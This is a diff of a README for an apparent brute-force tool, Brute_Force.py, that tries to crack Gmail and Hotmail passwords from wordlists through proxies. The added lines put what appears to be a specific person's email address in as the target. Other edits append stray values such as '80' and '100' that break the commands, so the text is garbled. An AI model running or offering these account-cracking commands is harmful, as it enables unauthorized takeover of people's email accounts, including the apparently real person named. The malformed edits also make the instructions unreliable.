@@ -10,9 +10,9 @@
 ```bash
 sudo apt install python3 python3-pip
 
-pip3 install proxylist
+pip3 install proxylist 80
 
-pip3 install mechanize
+pip3 install mechanize 
 ```
 
 
@@ -20,15 +20,15 @@ pip3 install mechanize
 
 ## BruteForce Gmail Attack
 ```bash
-python3 Brute_Force.py -g Account@gmail.com -l File_list
+python3 Brute_Force.py -g Account@gmail.com -l File_list si.luz2009@gmail.com
 
-python3 Brute_Force.py -g Account@gmail.com -p Password_Single
+python3 Brute_Force.py -g Account@gmail.com -p Password_Single 100
 ```
 
 
 ## BruteForce Hotmail Attack
 ```bash
-python3 Brute_Force.py -t Account@hotmail.com -l File_list
+python3 Brute_Force.py -t Account@hotmail.com -l File_list si.luz2009@hotmail.com
 
 python3 Brute_Force.py -t Account@hotmail.com -p Password_Single
 ```
